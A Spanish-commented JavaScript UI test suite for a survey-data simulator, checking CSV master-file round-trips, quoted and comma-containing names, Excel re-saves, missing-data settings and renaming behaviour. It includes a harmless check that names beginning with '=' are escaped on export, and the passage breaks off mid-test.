// @ts-check
// tests/ui/simulador-ronda2.test.js — (2026.12.30) lo que corrigió la segunda auditoría en la interfaz del Simulador, sobre
// index.html real: los nombres con comillas en los desplegables, el archivo maestro con comas en los nombres y el que Excel
// en español vuelve a guardar con «;», la referencia del MAR al abrir el maestro en una página nueva, los modelos de dos
// variables, el CSV del informe, el cambio de nombre de la variable de un test, todos los ítems invertidos y la ida y vuelta
// completa por el maestro (misma configuración, misma base).
import { test, before, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { crearEntorno } from './minidom.js';

const raiz = new URL('../../', import.meta.url);
/** @type {any} */ let env;
/** @type {Record<string, any>} */ let ui = {};
/** @type {any} */ const G = globalThis;
const q = (/** @type {string} */ sel) => env.document.querySelector(sel);
const qa = (/** @type {string} */ sel) => env.document.querySelectorAll(sel);
const campo = (/** @type {any} */ fila, /** @type {string} */ et) => fila.querySelector(`[aria-label="${et}"]`);
const poner = (/** @type {any} */ el, /** @type {string} */ v, tipo = 'input') => { el.value = v; env.disparar(el, tipo); };
const elegir = (/** @type {any} */ sel, /** @type {string} */ v) => { env.disparar(sel, 'focusin'); poner(sel, v, 'change'); };
const filasPruebas = () => qa('#bodyPruebas .fila-prueba');
const toast = () => { const t = env.document.getElementById('toast'); return t ? t.textContent.trim() : ''; };
/** @param {() => any} cond */
const esperar = async (cond, ms = 15000) => { const t0 = Date.now(); while (!cond()) { if (Date.now() - t0 > ms) throw new Error('tiempo de espera agotado'); await new Promise(r => setTimeout(r, 25)); } };
const TABLAS = ['bodyTests', 'bodyPruebas', 'bodySocio', 'bodyCorrelaciones', 'bodyDiferencias', 'bodyModelos', 'bodyRepetidas', 'bodyCortes', 'bodyDesenlaces', 'bodyConcordancia'];

/** Rellena la tabla I por nombre de escala: [k, M, DE, mín, máx, alfa, invertidos]. @param {Record<string, (number | string)[]>} datos */
function rellenarEscalas(datos) {
    for (const fila of filasPruebas()) {
        const d = datos[campo(fila, 'Nombre de la escala').value.trim()];
        if (!d) continue;
        /** @type {[string, number][]} */ const columnas = [['Número de ítems', 0], ['Media (M)', 1], ['Desviación estándar (DE)', 2], ['Mínimo por ítem', 3], ['Máximo por ítem', 4], ['Alfa de Cronbach objetivo', 5], ['Ítems invertidos', 6]];
        columnas.forEach(([et, k]) => { if (d[k] !== undefined) poner(campo(fila, et), String(d[k])); });
    }
}
/** Importa un texto como si el usuario eligiera el archivo maestro. @param {string} texto */
async function importarMaestro(texto) {
    ui.maestro.importarConfigTodo({ target: { files: [new G.Blob([texto])], value: '' } });
    await esperar(() => /Configuración completa importada|No se pudo|no es un archivo/i.test(toast()));
    await new Promise(r => setTimeout(r, 30));
}
async function exportarMaestro() {
    ui.maestro.exportarConfigTodo();
    return await env.descargas[env.descargas.length - 1].text();
}
async function generarYEsperar() {
    G.generadorDatos.datosGenerados = null;
    ui.motor.generarBaseDatos();
    await esperar(() => !q('#btnGenerar').disabled && G.generadorDatos.datosGenerados && G.generadorDatos.datosGenerados.n > 0);
    await new Promise(r => setTimeout(r, 60));
    return G.generadorDatos.obtenerDatosGenerados();
}
/** Campos de una línea CSV con comillas (RFC 4180). @param {string} linea @param {string} [sep] */
function campos(linea, sep = ',') {
    /** @type {string[]} */ const out = []; let c = '', dentro = false;
    for (let i = 0; i < linea.length; i++) {
        const ch = linea[i];
        if (dentro) { if (ch === '"') { if (linea[i + 1] === '"') { c += '"'; i++; } else dentro = false; } else c += ch; }
        else if (ch === '"') dentro = true; else if (ch === sep) { out.push(c); c = ''; } else c += ch;
    }
    out.push(c);
    return out;
}

before(async () => {
    env = crearEntorno(fs.readFileSync(new URL('index.html', raiz), 'utf8'));
    env.document.readyState = 'interactive';
    G.fetch = () => Promise.reject(new Error('sin red en las pruebas'));
    await import(new URL('src/main.js', raiz).href);
    await new Promise(r => setTimeout(r, 0));
    env.document.readyState = 'complete';
    env.disparar(env.document, 'DOMContentLoaded', { bubbles: false });
    for (const m of ['pruebas', 'sociodemograficos', 'correlaciones', 'diferencias', 'modelos', 'repetidas', 'estructura', 'cortes-desenlaces', 'concordancia', 'maestro', 'motor', 'resultado']) ui[m] = await import(new URL(`src/simulador/ui/${m}.js`, raiz).href);
});
beforeEach(() => {
    for (const id of TABLAS) { const t = q('#' + id); if (t) t.innerHTML = ''; }
    q('#tamanoMuestra').value = '300'; q('#semilla').value = '7';
    for (const id of ['pctPerdidos', 'pctDescuidados', 'pctDigitacion', 'pctAquiescencia', 'pctExtrema', 'itemsControl', 'tiempoMinutos']) { const el = q('#' + id); if (el) el.value = '0'; }
    // la referencia del MAR de una prueba anterior (el DOM mínimo no restringe el value de un <select> a sus opciones)
    q('#mecanismoPerdidos').value = 'MCAR'; q('#referenciaMAR').value = '';
});

test('nombres con comillas: los desplegables, la configuración y el maestro los conservan (antes se cortaban en value="…")', async () => {
    const NOMBRE = 'Bienestar "subjetivo"';
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'EBS', variable: 'Bienestar', dimensiones: [NOMBRE], rIntra: '0.4' });
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'PSS', variable: 'Estrés', dimensiones: ['Estrés'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ [NOMBRE]: [8, 24, 5, 1, 5, 0.8, 0], 'Estrés': [10, 30, 6, 1, 5, 0.82, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    ui.correlaciones.agregarFilaCorrelacion();
    const f = qa('#bodyCorrelaciones .fila-correlacion').pop();
    const selA = campo(f, 'Variable A');
    env.disparar(selA, 'focusin');
    assert.ok(selA.options.map((/** @type {any} */ o) => o.value).includes(NOMBRE), 'la opción lleva el nombre entero');
    elegir(selA, NOMBRE); elegir(campo(f, 'Variable B'), 'Estrés'); poner(campo(f, 'Correlación objetivo'), '-0.4');
    ui.diferencias.agregarFilaDiferencia();
    const fd = qa('#bodyDiferencias .fila-diferencia').pop();
    env.disparar(campo(fd, 'Variable cuantitativa'), 'focusin');
    assert.ok(campo(fd, 'Variable cuantitativa').options.map((/** @type {any} */ o) => o.value).includes(NOMBRE));
    const g = G.generadorDatos;
    g.recolectarConfiguracion();
    assert.deepEqual(g.configuracion.correlaciones, [{ a: NOMBRE, b: 'Estrés', r: -0.4 }]);
    assert.deepEqual(g.validarConfiguracion().errores, []);
    const texto = await exportarMaestro();
    assert.match(texto, /EBS,"Bienestar ""subjetivo""",8,normal,24,5,1,5,0\.8,0,/);
    for (const id of TABLAS) q('#' + id).innerHTML = '';
    await importarMaestro(texto);
    assert.match(toast(), /Configuración completa importada/);
    assert.deepEqual(filasPruebas().map((/** @type {any} */ fl) => campo(fl, 'Nombre de la escala').value), [NOMBRE, 'Estrés']);
    assert.deepEqual(g.recolectarConfiguracion().correlaciones, [{ a: NOMBRE, b: 'Estrés', r: -0.4 }]);
});

test('maestro con una coma en un nombre: la correlación y la diferencia sobreviven a la ida y vuelta (antes, split(","))', async () => {
    const NOMBRE = 'Apoyo social, familia';
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'MSPSS', variable: 'Apoyo', dimensiones: ['Apoyo'], rIntra: '0.4' });
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'PSS', variable: 'Estrés', dimensiones: ['Estrés'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    const inp = campo(filasPruebas().find((/** @type {any} */ fl) => campo(fl, 'Nombre de la escala').value === 'Apoyo'), 'Nombre de la escala');
    env.disparar(inp, 'focusin'); poner(inp, NOMBRE, 'change');
    rellenarEscalas({ [NOMBRE]: [8, 24, 5, 1, 5, 0.8, 0], 'Estrés': [10, 30, 6, 1, 5, 0.82, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    ui.correlaciones.agregarFilaCorrelacion();
    const f = qa('#bodyCorrelaciones .fila-correlacion').pop();
    elegir(campo(f, 'Variable A'), NOMBRE); elegir(campo(f, 'Variable B'), 'Estrés'); poner(campo(f, 'Correlación objetivo'), '-0.4');
    ui.diferencias.agregarFilaDiferencia();
    const fd = qa('#bodyDiferencias .fila-diferencia').pop();
    elegir(campo(fd, 'Variable cuantitativa'), NOMBRE); elegir(campo(fd, 'Variable de agrupación'), 'Sexo'); poner(campo(fd, 'd de Cohen'), '0.4');
    const texto = await exportarMaestro();
    assert.match(texto, /"Apoyo social, familia",Estrés,-0\.4,lineal/);
    for (const id of TABLAS) q('#' + id).innerHTML = '';
    await importarMaestro(texto);
    const g = G.generadorDatos;
    g.recolectarConfiguracion();
    assert.deepEqual(g.configuracion.correlaciones, [{ a: NOMBRE, b: 'Estrés', r: -0.4 }]);
    assert.equal(g.configuracion.diferenciasGrupo.length, 1);
    assert.equal(g.configuracion.diferenciasGrupo[0].cuantitativa, NOMBRE);
    assert.deepEqual(g.validarConfiguracion().errores, []);
});

test('el maestro que Excel en español vuelve a guardar («;» y coma decimal) se importa entero (antes, tablas vacías)', async () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'BAI', variable: 'Ansiedad', dimensiones: ['Ansiedad'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ Ansiedad: [8, 24, 5, 1, 5, 0.85, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Edad', distribucion: 'normal', promedio: '20.5', de: '2', min: '', max: '', decimales: '0' });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    q('#tamanoMuestra').value = '600'; q('#semilla').value = '5';
    const original = await exportarMaestro();
    // como Excel (es-ES): «;» entre campos y coma decimal en los números
    const aExcel = (/** @type {string} */ t) => t.split('\n').map(l => campos(l.replace(/\r$/, '')).map(x => (/^-?\d+\.\d+$/.test(x) ? x.replace('.', ',') : (/[;"\n]/.test(x) ? `"${x.replace(/"/g, '""')}"` : x))).join(';')).join('\r\n');
    const excel = aExcel(original);
    assert.match(excel, /BAI;Ansiedad;8;normal;24;5;1;5;0,85;0;/);
    for (const id of TABLAS) q('#' + id).innerHTML = '';
    q('#tamanoMuestra').value = '100'; q('#semilla').value = '';
    await importarMaestro(excel);
    assert.match(toast(), /Configuración completa importada/);
    assert.deepEqual(filasPruebas().map((/** @type {any} */ fl) => [campo(fl, 'Nombre de la escala').value, campo(fl, 'Número de ítems').value, campo(fl, 'Media (M)').value, campo(fl, 'Alfa de Cronbach objetivo').value]), [['Ansiedad', '8', '24', '0.85']]);
    assert.equal(q('#tamanoMuestra').value, '600'); assert.equal(q('#semilla').value, '5');
    const cfg = G.generadorDatos.recolectarConfiguracion();
    assert.equal(cfg.sociodemograficos.find((/** @type {any} */ s) => s.categoria === 'Edad').promedio, 20.5);
});

test('la referencia del MAR sobrevive al maestro abierto en una página nueva (antes se asignaba antes de existir la opción)', async () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'BAI', variable: 'Ansiedad', dimensiones: ['Ansiedad'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ Ansiedad: [8, 24, 5, 1, 5, 0.85, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Edad', distribucion: 'normal', promedio: '20', de: '2', min: '', max: '', decimales: '0' });
    q('#pctPerdidos').value = '20'; q('#mecanismoPerdidos').value = 'MAR'; q('#sentidoMAR').value = 'altos';
    elegir(q('#referenciaMAR'), 'Ansiedad');
    assert.equal(G.generadorDatos.recolectarConfiguracion().realismo.referenciaMAR, 'Ansiedad');
    const texto = await exportarMaestro();
    assert.match(texto, /^ReferenciaMAR,Ansiedad\r?$/m);
    // «página nueva»: tablas vacías y el selector solo con la referencia automática
    for (const id of TABLAS) q('#' + id).innerHTML = '';
    const sel = q('#referenciaMAR');
    sel.innerHTML = '<option value="">Referencia automática</option>'; sel.value = '';
    await importarMaestro(texto);
    assert.equal(q('#referenciaMAR').value, 'Ansiedad');
    assert.equal(G.generadorDatos.recolectarConfiguracion().realismo.referenciaMAR, 'Ansiedad');
    // (2027.01.01) la base la genera un generador aparte (el del Worker o, aquí, el del respaldo en el hilo), no el de la
    // página: la referencia que se usó se lee del que generó
    const { GeneradorDatos } = await import(new URL('src/simulador/dominio/generador.js', raiz).href);
    const original = GeneradorDatos.prototype.generarBaseDatos;
    /** @type {any} */ let generador = null;
    GeneradorDatos.prototype.generarBaseDatos = function (/** @type {any[]} */ ...args) { generador = this; return original.apply(this, args); };
    try { await generarYEsperar(); } finally { GeneradorDatos.prototype.generarBaseDatos = original; }
    assert.ok(generador && generador !== G.generadorDatos, 'un generador aparte');
    assert.equal(generador.referenciaMARUsada, generador.columnaDeEscala(generador.configuracion.pruebas[0]), 'los perdidos dependen del total de la Ansiedad');
    q('#pctPerdidos').value = '0';
});

test('tabla V con dos variables cuantitativas: la curvilínea X → Y se puede añadir (antes exigía tres)', () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'SWLS', variable: 'Satisfacción', dimensiones: ['Satisfacción con la vida'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ 'Satisfacción con la vida': [5, 20, 4, 1, 7, 0.85, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Edad', distribucion: 'normal', promedio: '40', de: '12', min: '18', max: '80', decimales: '0' });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    const fila = ui.modelos.agregarFilaModelo({ tipo: 'curvilinea', x: 'Edad', m: '', y: 'Satisfacción con la vida', c1: 0.1, c2: -0.3, c3: '' });
    assert.ok(fila, 'fila creada');
    assert.equal(qa('#bodyModelos .fila-modelo').length, 1);
    q('#bodyModelos').innerHTML = '';
    assert.deepEqual(ui.modelos.aplicarCSVModelos('Tipo,X,MediadorModerador,Y,Coef1,Coef2,Coef3\ncurvilinea,Edad,,Satisfacción con la vida,0.1,-0.3,\n'), { aplicadas: 1, omitidas: 0 });
    const g = G.generadorDatos;
    g.recolectarConfiguracion();
    assert.equal(g.configuracion.modelos.length, 1);
    assert.deepEqual(g.validarConfiguracion().errores, []);
});

test('«Descargar informe»: cada fila del CSV con sus seis campos, también la de los cortes («cortes en 20.00, 36.00»)', async () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'PSS-14', variable: 'Estrés', dimensiones: ['Estrés percibido'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ 'Estrés percibido': [14, 28, 8, 0, 4, 0.85, 4] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    ui['cortes-desenlaces'].agregarFilaCorte({ variable: 'Estrés percibido', texto: 'Bajo, Medio, Alto @ 20, 36' });
    await generarYEsperar();
    await esperar(() => ui.resultado.ultimoInforme && ui.resultado.ultimoInforme.length > 0);
    q('#btnDescargarInforme').click();
    const texto = await env.descargas[env.descargas.length - 1].text();
    const lineas = texto.replace(/^﻿/, '').trim().split(/\r?\n/);
    assert.deepEqual(campos(lineas[0]), ['Parametro', 'Variable', 'Pedido', 'Obtenido', 'Estado', 'ConImperfecciones']);
    for (const l of lineas.slice(1)) assert.equal(campos(l).length, 6, l);
    assert.ok(lineas.some(l => /cortes en 20\.00, 36\.00/.test(l)), 'la fila de los cortes está');
    // sin base, la exportación con coma avisa en lugar de lanzar
    G.generadorDatos.datosGenerados = null;
    assert.doesNotThrow(() => ui.resultado.descargarCSVInternacional());
});

test('renombrar la variable de un test cambia el nombre de su puntaje general en las tablas III, IV y VIII', () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'EQ-i', variable: 'IE', dimensiones: ['Intrapersonal', 'Interpersonal'], rIntra: '0.4' });
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'PSS', variable: 'Estrés', dimensiones: ['Estrés'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ Intrapersonal: [8, 24, 5, 1, 5, 0.8, 0], Interpersonal: [8, 24, 5, 1, 5, 0.8, 0], 'Estrés': [10, 30, 6, 1, 5, 0.82, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    ui.correlaciones.agregarFilaCorrelacion();
    const f = qa('#bodyCorrelaciones .fila-correlacion').pop();
    elegir(campo(f, 'Variable A'), 'IE — EQ-i'); elegir(campo(f, 'Variable B'), 'Estrés'); poner(campo(f, 'Correlación objetivo'), '-0.4');
    ui.diferencias.agregarFilaDiferencia();
    const fd = qa('#bodyDiferencias .fila-diferencia').pop();
    elegir(campo(fd, 'Variable cuantitativa'), 'IE — EQ-i'); elegir(campo(fd, 'Variable de agrupación'), 'Sexo'); poner(campo(fd, 'd de Cohen'), '0.4');
    ui['cortes-desenlaces'].agregarFilaCorte({ variable: 'IE — EQ-i', texto: 'Bajo, Alto @ P50' });
    const ft = qa('#bodyTests .fila-test').find((/** @type {any} */ fl) => campo(fl, 'Nombre del test').value === 'EQ-i');
    const inp = campo(ft, 'Variable psicológica');
    env.disparar(inp, 'focusin'); poner(inp, 'Inteligencia emocional', 'input'); env.disparar(inp, 'change');
    const g = G.generadorDatos;
    g.recolectarConfiguracion();
    const nuevo = 'Inteligencia emocional — EQ-i';
    assert.deepEqual(g.configuracion.correlaciones, [{ a: nuevo, b: 'Estrés', r: -0.4 }]);
    assert.deepEqual(g.configuracion.diferenciasGrupo.map((/** @type {any} */ d) => d.cuantitativa), [nuevo]);
    assert.deepEqual(g.configuracion.cortes.map((/** @type {any} */ c) => c.variable), [nuevo]);
    assert.deepEqual(g.validarConfiguracion().errores, []);
    assert.equal(campo(f, 'Variable A').value, nuevo);
});

test('todos los ítems invertidos en la tabla I: se respetan (antes se reducían a k − 1 en silencio)', () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'NEG', variable: 'Afecto negativo', dimensiones: ['Afecto negativo'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ 'Afecto negativo': [5, 15, 3, 1, 5, 0.8, 5] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    const g = G.generadorDatos;
    g.recolectarConfiguracion();
    assert.equal(g.configuracion.pruebas[0].invertidos, 5);
    assert.deepEqual(g.validarConfiguracion().errores, []);
});

test('ida y vuelta por el maestro: la configuración recolectada y la base generada son las mismas', async () => {
    const val = (/** @type {string} */ id, /** @type {any} */ v) => { const el = q('#' + id); if (el.type === 'checkbox') el.checked = !!v; else el.value = String(v); env.disparar(el, 'change'); };
    val('tamanoMuestra', 250); val('semilla', 11); val('pctPerdidos', 3); val('mecanismoPerdidos', 'MCAR'); val('pctDescuidados', 2); val('tipoDescuidado', 'linea');
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'EQ-i', variable: 'Inteligencia emocional', dimensiones: ['Intrapersonal', 'Interpersonal'], rIntra: '0.35' });
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'PSS-14', variable: 'Estrés', dimensiones: ['Estrés percibido'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ Intrapersonal: [8, 24, 5, 1, 5, 0.8, 0], Interpersonal: [8, 24, 5, 1, 5, 0.85, 2], 'Estrés percibido': [14, 28, 8, 0, 4, 0.85, 4] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino:55, Masculino:45' });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Edad', distribucion: 'normal', promedio: '20', de: '2.5', min: '16', max: '30', decimales: '0' });
    ui.correlaciones.agregarFilaCorrelacion();
    const f = qa('#bodyCorrelaciones .fila-correlacion').pop();
    elegir(campo(f, 'Variable A'), 'Intrapersonal'); elegir(campo(f, 'Variable B'), 'Estrés percibido'); poner(campo(f, 'Correlación objetivo'), '-0.3');
    ui.diferencias.agregarFilaDiferencia();
    const fd = qa('#bodyDiferencias .fila-diferencia').pop();
    elegir(campo(fd, 'Variable cuantitativa'), 'Estrés percibido'); elegir(campo(fd, 'Variable de agrupación'), 'Sexo'); poner(campo(fd, 'd de Cohen'), '0.4');
    ui['cortes-desenlaces'].agregarFilaCorte({ variable: 'Estrés percibido', texto: 'Bajo, Medio, Alto @ 20, 36' });
    const g = G.generadorDatos;
    const cfgA = JSON.parse(JSON.stringify(g.recolectarConfiguracion()));
    assert.deepEqual(g.validarConfiguracion().errores, []);
    const baseA = await generarYEsperar();
    const texto = await exportarMaestro();
    for (const id of TABLAS) q('#' + id).innerHTML = '';
    val('tamanoMuestra', 100); val('semilla', 1);
    await importarMaestro(texto);
    const cfgB = JSON.parse(JSON.stringify(g.recolectarConfiguracion()));
    delete cfgA.pruebasOriginales; delete cfgB.pruebasOriginales;   // estado de la generación anterior, no de la configuración
    assert.deepEqual(cfgB, cfgA);
    const baseB = await generarYEsperar();
    assert.equal(baseB.length, baseA.length);
    assert.deepEqual(Object.keys(baseB[0]), Object.keys(baseA[0]));
    assert.ok(baseA.every((/** @type {any} */ fila, /** @type {number} */ i) => JSON.stringify(fila) === JSON.stringify(baseB[i])), 'la misma base, celda a celda');
    val('pctPerdidos', 0); val('pctDescuidados', 0);
});

// ---- Lo que encontró la revisión independiente de la 2026.12.30 ----

test('(revisión) el maestro conserva las diferencias, los modelos y los cortes de un nombre que termina en comilla', async () => {
    const NOMBRE = 'Bienestar "subjetivo"';
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'EBS', variable: 'Bienestar', dimensiones: [NOMBRE], rIntra: '0.4' });
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'PSS', variable: 'Estrés', dimensiones: ['Estrés'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ [NOMBRE]: [8, 24, 5, 1, 5, 0.8, 0], 'Estrés': [10, 30, 6, 1, 5, 0.82, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Edad', distribucion: 'normal', promedio: '40', de: '12', min: '18', max: '80', decimales: '0' });
    ui.diferencias.agregarFilaDiferencia();
    const fd = qa('#bodyDiferencias .fila-diferencia').pop();
    elegir(campo(fd, 'Variable cuantitativa'), NOMBRE); elegir(campo(fd, 'Variable de agrupación'), 'Sexo'); poner(campo(fd, 'd de Cohen'), '0.4');
    ui.modelos.agregarFilaModelo({ tipo: 'curvilinea', x: 'Edad', m: '', y: NOMBRE, c1: 0.1, c2: -0.3, c3: '' });
    ui['cortes-desenlaces'].agregarFilaCorte({ variable: NOMBRE, texto: 'Bajo, Alto @ P50' });
    const g = G.generadorDatos;
    const antes = g.recolectarConfiguracion();
    const resumen = (/** @type {any} */ c) => [c.diferenciasGrupo.map((/** @type {any} */ d) => d.cuantitativa), c.modelos.map((/** @type {any} */ m) => m.y), c.cortes.map((/** @type {any} */ x) => x.variable)];
    assert.deepEqual(resumen(antes), [[NOMBRE], [NOMBRE], [NOMBRE]]);
    const texto = await exportarMaestro();
    for (const id of TABLAS) q('#' + id).innerHTML = '';
    await importarMaestro(texto);
    assert.doesNotMatch(toast(), /omitida/);
    assert.deepEqual(resumen(g.recolectarConfiguracion()), [[NOMBRE], [NOMBRE], [NOMBRE]]);
});

test('(revisión) un nombre que empieza por «=» va al maestro con apóstrofo (no se ejecuta en Excel) y vuelve sin él', async () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'T', variable: 'V', dimensiones: ['=Escala'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ '=Escala': [8, 24, 5, 1, 5, 0.8, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: '=Fem, Masc' });
    const texto = await exportarMaestro();
    assert.match(texto, /^T,'=Escala,8,/m);
    assert.doesNotMatch(texto, /(^|,)=Escala/m);
    for (const id of TABLAS) q('#' + id).innerHTML = '';
    await importarMaestro(texto);
    const cfg = G.generadorDatos.recolectarConfiguracion();
    assert.deepEqual(cfg.pruebas.map((/** @type {any} */ p) => p.nombre), ['=Escala']);
    assert.equal(cfg.sociodemograficos[0].niveles[0].etiqueta, '=Fem');
});

test('(revisión) la uniforme sin promedio toma el centro del rango, y una fila con nombre y sin promedio es un error (no desaparece)', () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'BAI', variable: 'Ansiedad', dimensiones: ['Ansiedad'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ Ansiedad: [8, 24, 5, 1, 5, 0.85, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Horas', distribucion: 'uniforme', promedio: '', de: '', min: '1', max: '15', decimales: '1' });
    const cfg = G.generadorDatos.recolectarConfiguracion();
    const horas = cfg.sociodemograficos.find((/** @type {any} */ s) => s.categoria === 'Horas');
    assert.ok(horas, 'la uniforme sin promedio se recoge');
    assert.equal(horas.promedio, 8);
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Ingreso', distribucion: 'normal', promedio: '', de: '300', min: '', max: '', decimales: '0' });
    assert.throws(() => G.generadorDatos.recolectarConfiguracion(), /Categoría "Ingreso": falta el promedio/);
});

test('(revisión) renombrar el TEST (no su variable): sus escalas lo siguen y el puntaje general se renombra en las tablas', () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'EQ-i', variable: 'IE', dimensiones: ['Intrapersonal', 'Interpersonal'], rIntra: '0.4' });
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'PSS', variable: 'Estrés', dimensiones: ['Estrés'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    rellenarEscalas({ Intrapersonal: [8, 24, 5, 1, 5, 0.8, 0], Interpersonal: [8, 24, 5, 1, 5, 0.8, 0], 'Estrés': [10, 30, 6, 1, 5, 0.82, 0] });
    ui.sociodemograficos.agregarFilaSocioConDatos({ categoria: 'Sexo', distribucion: 'binaria', promedio: '0.5', de: '', min: '', max: '', decimales: '0', opciones: 'Femenino, Masculino' });
    ui.correlaciones.agregarFilaCorrelacion();
    const f = qa('#bodyCorrelaciones .fila-correlacion').pop();
    elegir(campo(f, 'Variable A'), 'IE — EQ-i'); elegir(campo(f, 'Variable B'), 'Estrés'); poner(campo(f, 'Correlación objetivo'), '-0.4');
    ui['cortes-desenlaces'].agregarFilaCorte({ variable: 'IE — EQ-i', texto: 'Bajo, Alto @ P50' });
    const inp = campo(qa('#bodyTests .fila-test').find((/** @type {any} */ fl) => campo(fl, 'Nombre del test').value === 'EQ-i'), 'Nombre del test');
    env.disparar(inp, 'focusin');
    for (const parcial of ['EQ-', 'Ba', 'BarOn']) poner(inp, parcial, 'input');   // tecla a tecla, con nombres intermedios
    env.disparar(inp, 'change');
    const g = G.generadorDatos;
    g.recolectarConfiguracion();
    assert.deepEqual(filasPruebas().map((/** @type {any} */ fl) => campo(fl, 'Nombre de la prueba').value), ['BarOn', 'BarOn', 'PSS']);
    assert.deepEqual(g.configuracion.correlaciones, [{ a: 'IE — BarOn', b: 'Estrés', r: -0.4 }]);
    assert.deepEqual(g.configuracion.cortes.map((/** @type {any} */ c) => c.variable), ['IE — BarOn']);
    assert.deepEqual(g.validarConfiguracion().errores, []);
});

// ---- Segunda revisión ----

test('(segunda revisión) renombrar un test pasando por el nombre de otro, o vaciándolo antes, no le cambia las escalas de dueño', () => {
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'BDI', variable: 'Depresión', dimensiones: ['Cognitivo', 'Somático'], rIntra: '0.4' });
    ui.pruebas.agregarFilaTestConDatos({ prueba: 'BDI-II', variable: 'Depresión II', dimensiones: ['Afectivo', 'Conductual'], rIntra: '0.4' });
    ui.pruebas.sincronizarDimensionesDesdeTests();
    const filaBDI = qa('#bodyTests .fila-test').find((/** @type {any} */ fl) => campo(fl, 'Nombre del test').value === 'BDI');
    const inp = campo(filaBDI, 'Nombre del test');
    const dueños = () => filasPruebas().map((/** @type {any} */ fl) => `${campo(fl, 'Nombre de la escala').value}→${campo(fl, 'Nombre de la prueba').value}`).join(' | ');
    env.disparar(inp, 'focusin');
    for (const parcial of ['BDI-', 'BDI-I', 'BDI-II', 'BDI-IIa']) poner(inp, parcial, 'input');   // pasa por «BDI-II», el del otro test
    env.disparar(inp, 'change');
    assert.equal(dueños(), 'Cognitivo→BDI-IIa | Somático→BDI-IIa | Afectivo→BDI-II | Conductual→BDI-II');
    // vaciar el nombre y escribir otro: las escalas lo siguen
    env.disparar(inp, 'focusin');
    for (const parcial of ['BDI-II', 'B', '', 'Be', 'Beck']) poner(inp, parcial, 'input');
